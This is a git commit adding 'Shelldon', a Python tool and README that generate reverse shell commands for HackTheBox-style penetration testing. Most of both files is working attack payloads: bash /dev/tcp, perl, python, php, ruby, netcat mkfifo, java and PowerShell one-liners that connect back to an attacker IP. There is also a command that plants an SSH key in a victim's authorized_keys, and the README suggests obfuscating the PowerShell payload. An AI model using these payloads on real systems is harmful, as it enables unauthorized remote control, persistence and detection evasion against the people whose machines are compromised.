aa4196d29ae52c6d62f0fbae3b74c542ac44d88f
ChefByzen <66879877+ChefByzen@users.noreply.github.com>
2020-06-13 14:04:47 -0400

    Initial commit

---
+++ README.md
@@ -0,0 +1,182 @@
+# Shelldon
+Shelldon is a simple python tool for creating a customizable reverse shell payload with very little effort
+
+This is a tool I developed while working on HackTheBox machines for convenience. Instead of having to refer to http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet every five minutes, I created this program.
+
+It is extremely basic, so feel free to improve it on your own time. I'm not interested in actively maintaining this, however I'm open to making improvements to it.
+
+# Installation
+All you really need is python3.
+
+The following command is given for clipboard functionality and convenience.
+```
+apt-get install python3 -y
+apt-get install xclip -y
+echo 'alias pbcopy='xclip -selection clipboard' >> ~/.bashrc
+echo 'alias pbpaste='xclip -selection clipboard' >> ~/.bashrc
+ln -s $(locate shelldon.py) /usr/local/sbin/shelldon
+```
+
+# Important Files
+Be sure to edit your preferences in the shelldon.conf file.
+```
+[INIT]
+config = default
+
+[default]
+interface = eth0
+port = 53
+linuxcmd = /bin/sh
+windowscmd = cmd.exe
+
+[htb]
+interface = tun0
+port = 53
+linuxcmd = /bin/sh
+windowscmd = cmd.exe
+```
+The `INIT.config` option tells shelldon which configuration to use. This value can be edited either manually or with the `shelldon configuration` command.
+
+The `.interface` option tells shelldon where to look for your current IP address. Because HackTheBox IPs change every day, shelldon will look at the tun0 interface and find your IP address. Thus when running shelldon, you don't need to type it out.
+
+The `.port` option tells shelldon what port you prefer to listen on for your reverse shells.
+
+The `.linuxcmd` option is the location of the interactive shell you'd like to send. Ex. `nc -e /bin/sh 10.0.0.1 53`
+
+The `.windowscmd` option is what will be used instead if the -w option is specified. Ex. `nc.exe -e cmd.exe 10.0.0.1 53`
+
+# Usage
+```
+root@kali:/opt/shelldon# shelldon --help
+usage: shelldon [-h] [-c COMMAND] [-i IP] [-p PORT] [-a] [-w] [-y] [-e {single,double,both}] method
+
+Create a customizable reverse shell with little effort!
+
+positional arguments:
+  method                (bash, perl, python, php, ruby, nc, java, powershell, ssh, configure)
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -c COMMAND            Non-regular name of program (Ex. nc.exe)
+  -i IP, --ip IP        Listening ip address
+  -p PORT, --port PORT  Listening port
+  -a, --alternate       Alternate functionality
+  -w, --windows         Runs cmd.exe instead of /bin/sh
+  -y, --clipboard       Saves command to clipboard instead of printing
+  -e {single,double,both}, --escape {single,double,both}
+                        Escapes single or double quotes. Useful for pasting
+
+Thanks, Shelldon!
+```
+
+# Methods
+## Configure
+```
+root@kali:/opt/shelldon# shelldon configure
+Enter new default configuration: htb
+Default configuration changed to htb (was default)
+```
+The configure method allows you to change the initial configuration (located in the shelldon.conf file) used.
+
+## Bash
+```
+root@kali:/opt/shelldon# shelldon bash
+/bin/sh -i >& /dev/tcp/10.0.0.1/53 0>&1
+```
+- **No COMMAND funcionality**
+- **No --alternate funcionality**
+
+## Perl
+```
+root@kali:/opt/shelldon# shelldon perl
+perl -e 'use Socket;$i="10.0.0.1";$p=53;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+```
+- **Default COMMAND: perl**
+- **No --alternate functionality**
+
+## Python
+```
+root@kali:/opt/shelldon# shelldon python
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",53));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+- **Default COMMAND: python3**
+- Note that because python2.7 is deprecated, it is likely you will need to specify the exact path with -c
+- Ex: `root@kali:/opt/shelldon# shelldon python -c /usr/bin/python3.8`
+
+## Python --alternate
+```
+root@kali:/opt/shelldon# shelldon python -a
+export TERM=screen-256color;python3 -c 'import pty;pty.spawn("/bin/bash")';
+```
+- **Default COMMAND: python3**
+- This is not a reverse shell, this is a pretty shell. I recommend typing `<CTRL+Z>stty raw -echo;fg<ENTER>` to make it fully interactive.
+- The TERM part is not necessary, I just prefer color.
+
+## PHP
+```
+root@kali:/opt/shelldon# shelldon python -a
+php -r '$sock=fsockopen("10.0.0.1",53);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
+- **Default COMMAND: php**
+- This is not a webshell. For php webshells, please refer to the /usr/share/webshells/php/ folder on Kali Linux.
+- **No --alternate functionality**
+
+## Ruby
+```
+root@kali:/opt/shelldon# shelldon ruby
+ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",53).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+```
+- **Default COMMAND: ruby**
+- **No --alternate functionality**
+
+## Netcat
+```
+root@kali:/opt/shelldon# shelldon nc
+nc -e /bin/sh 10.0.0.1 53
+```
+- **Default COMMAND: nc**
+- Only works with netcat-traditional
+
+## Netcat --alternate
+```
+root@kali:/opt/shelldon# shelldon nc -a
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 53 >/tmp/f
+```
+- **Default COMMAND: nc**
+- Used for netcat-openbsd (which is the default installation for most linux servers)
+
+## Java
+```
+root@kali:/opt/shelldon# shelldon java
+r = Runtime.getRuntime()
+p = r.exec(["/bin/sh","-c","exec 5<>/dev/tcp/10.0.0.1/53;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+```
+- **No COMMAND funcionality**
+- **No --alternate functionality**
+
+## Powershell
+```
+root@kali:/opt/shelldon# shelldon powershell
+powershell.exe -c "$client = New-Object System.Ns.TCPClient('10.0.0.1',53);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+- **Default COMMAND: powershell.exe**
+- While I could not automate the process, I suggest using Invoke-Obfuscation to obfuscate this.
+
+## Powershell --alternate
+```
+root@kali:/opt/shelldon# shelldon powershell -a
+powershell.exe -c "$sm=(New-Object Net.Sockets.TCPClient('10.0.0.1',53)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}"
+```
+- **Default COMMAND: powershell.exe**
+
+## SSH
+```
+root@kali:/opt/shelldon# shelldon ssh
+echo 'ssh-rsa XXXXXXXXX root@kali' >> \
+```
+- **No COMMAND functionality**
+- This is not a reverse shell. This command grabs the contents of your `$HOME/.ssh/id_rsa.pub` file and puts it into this convenient open-ended echo command.
+- When pasting this command over to your victim, you will need to type in the path for their `~/.ssh/authorized_keys` file. This will allow you to ssh in as the victim with `ssh -i ~/.ssh/id_rsa victim@box.htb`
+- **No --alternate functionality**
+
---
+++ shelldon.py
@@ -0,0 +1,170 @@
+#!/usr/bin/env python3
+import argparse, configparser, sys, subprocess, os
+
+# This function will return the IPv4 address associated with a given interface
+def getIP(interface):
+	p1 = subprocess.Popen(["ifconfig"], stdout=subprocess.PIPE)
+	p2 = subprocess.Popen(["grep", interface, "-A1"], stdin=p1.stdout, stdout=subprocess.PIPE)
+	p3 = subprocess.Popen(["grep", "inet"], stdin=p2.stdout, stdout=subprocess.PIPE)
+	ip = subprocess.check_output(["cut", "-d", " ", "-f10"], stdin=p3.stdout).decode('utf-8').strip()
+	return ip
+
+# This function will return the command for a bash reverse shell
+def bashShell(cmd, host, port):
+	output = """%s -i >& /dev/tcp/%s/%s 0>&1"""%(cmd,host,port)
+	return output
+
+# This function will return the command for a perl reverse shell
+def perlShell(prog, cmd, host, port):
+	output = """%s -e 'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("%s -i");};'"""%(prog,host,port,cmd)
+	return output
+
+# This function with return the command for a python reverse shell
+# The alternate function is to return the command for a pretty shell
+def pythonShell(prog, cmd, host, port, alt):
+	if (alt):
+		output = """export TERM=screen-256color;%s -c 'import pty;pty.spawn("/bin/bash");';"""%(prog)
+	else:
+		output = """%s -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["%s","-i"]);'"""%(prog,host,port,cmd)
+	return output
+
+# This function will return the command for a php reverse shell
+def phpShell(prog, cmd, host, port):
+	output = """%s -r '$sock=fsockopen("%s",%s);exec("%s -i <&3 >&3 2>&3");'"""%(prog,host,port,cmd)
+	return output
+
+# This function will return the command for a ruby reverse shell
+def rubyShell(prog, cmd, host, port):
+	output = """%s -rsocket -e'f=TCPSocket.open("%s",%s).to_i;exec sprintf("%s -i <&%s >&%s 2>&%s",f,f,f)'"""%(prog,host,port,cmd,"%d","%d","%d")
+	return output
+
+# This function will return the command for a netcat-traditional reverse shell
+# The alternate function is to return the command for a netcat-openbsd reverse shell
+def ncShell(prog, cmd, host, port, alt):
+	if (alt):
+		output = """rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|%s -i 2>&1|%s %s %s >/tmp/f"""%(cmd,prog,host,port)
+	else:
+		output = """%s -e %s %s %s"""%(prog,cmd,host,port)
+	return output
+
+# This function will return the command for a java reverse shell
+def javaShell(cmd, host, port):
+	output = """r = Runtime.getRuntime()\np = r.exec(["%s","-c","exec 5<>/dev/tcp/%s/%s;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])\np.waitFor()"""%(cmd,host,port)
+	return output
+
+# This function will return the command for a powershell reverse shell
+# The alternate function returns a different syntax for a powershell reverse shell
+def psShell(prog, host, port, alt):
+	if (alt):
+		output = '''%s -c "$sm=(New-Object Net.Sockets.TCPClient('%s',%s)).GetStream();[byte[]]$bt=0..65535|%s{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}"'''%(prog,host,port,'%')
+	else:
+		output = '''%s -c "$client = New-Object System.Ns.TCPClient('%s',%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%s{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'''%(prog,host,port,'%')
+	return output
+
+# This function will return the command to append the contents of your id_rsa.pub to a victim's authorized_keys file
+def sshKey():
+	key = subprocess.check_output(["cat", "%s/.ssh/id_rsa.pub"%(os.environ["HOME"])]).decode('utf-8').strip()
+	output = """echo '%s' >> \\"""%(key)
+	return output
+
+# This function parses the arguments given and prints (or copies to clipboard) the command for a reverse shell
+def getShell(args):
+	if (args.windows):
+		cmd = config[conf]['WindowsCmd']
+	else:
+		cmd = config[conf]['LinuxCmd']
+
+	if (args.method == "configure"):
+		newconfig = input("Enter new default configuration: ")
+		if newconfig != 'INIT' and newconfig in config:
+			config['INIT']['Config'] = newconfig
+			with open('shelldon.conf', 'w') as configfile:
+				config.write(configfile)
+			print("Default configuration changed to %s (was %s)"%(newconfig,conf))
+		else:
+			print("Configuration doesn't exist! Check your shelldon.conf file.")
+		return
+
+	if (args.method == "bash"):
+		output = bashShell(cmd, args.ip, args.port)
+	elif (args.method == "perl"):
+		if (args.c):
+			prog = args.c
+		else:
+			prog = "perl"
+		output = perlShell(prog, cmd, args.ip, args.port)
+	elif (args.method == "python"):
+		if (args.c):
+			prog = args.c
+		else:
+			prog = "python3"
+		output = pythonShell(prog, cmd, args.ip, args.port, args.alternate)
+	elif (args.method == "php"):
+		if (args.c):
+			prog = args.c
+		else:
+			prog = "php"
+		output = phpShell(prog, cmd, args.ip, args.port)
+	elif (args.method == "ruby"):
+		if (args.c):
+			prog = args.c
+		else:
+			prog = "ruby"
+		output = rubyShell(prog, cmd, args.ip, args.port)
+	elif (args.method == "nc"):
+		if (args.c):
+			prog = args.c
+		else:
+			prog = "nc"
+		output = ncShell(prog, cmd, args.ip, args.port, args.alternate)
+	elif (args.method == "java"):
+		output = javaShell(cmd, args.ip, args.port)
+	elif (args.method == "powershell"):
+		if (args.c):
+			prog = args.c
+		else:
+			prog = "powershell.exe"
+		output = psShell(prog, args.ip, args.port, args.alternate)
+	
+	elif (args.method == "ssh"):
+		output = sshKey()
+
+	if (args.escape):
+		if (args.escape == 'both' or args.escape == 'single'):
+			output = output.replace("'","\\'");
+		if (args.escape == 'both' or args.escape == 'double'):
+			output = output.replace('"','\\"');
+				
+	if (args.clipboard):
+		p1 = subprocess.Popen(["echo",output], stdout=subprocess.PIPE)
+		subprocess.Popen(["xclip", "-selection", "clipboard"], stdin=p1.stdout)
+	else:
+		print(output, end='\n')
+
+if __name__ == '__main__':
+	config = configparser.ConfigParser()
+	config.read('shelldon.conf')
+	conf = config['INIT']['Config']
+
+	parser = argparse.ArgumentParser(description='Create a customizable reverse shell with little effort!', epilog="Thanks, Shelldon!")
+
+	parser.add_argument('method', metavar='method', help='(configure, bash, perl, python, php, ruby, nc, java, powershell, ssh)',choices=['configure', 'bash','perl','python','php','ruby','nc','java','powershell','ssh'])
+
+	parser.add_argument('-c', metavar='COMMAND', action='store', help='Non-regular name of program (Ex. nc.exe)')
+	parser.add_argument('-i', '--ip', action='store', help='Listening ip address')
+	parser.add_argument('-p', '--port', action='store', type=int, help='Listening port', default=config[conf]['Port'])
+	parser.add_argument('-a', '--alternate', action='store_true', help='Alternate functionality')
+	parser.add_argument('-w', '--windows', action='store_true', help='Runs %s instead of %s'%(config[conf]['WindowsCmd'],config[conf]['LinuxCmd']))
+	parser.add_argument('-y', '--clipboard', action='store_true', help='Saves command to clipboard instead of printing')
+	parser.add_argument('-e', '--escape', help='Escapes single or double quotes. Useful for pasting', choices=['single','double','both'])
+
+	if len(sys.argv) == 1:
+		parser.print_help()
+		sys.exit(1)
+
+	args = parser.parse_args()
+
+	if (not args.ip):
+		args.ip = getIP(config[conf]['Interface'])
+
+	getShell(args)
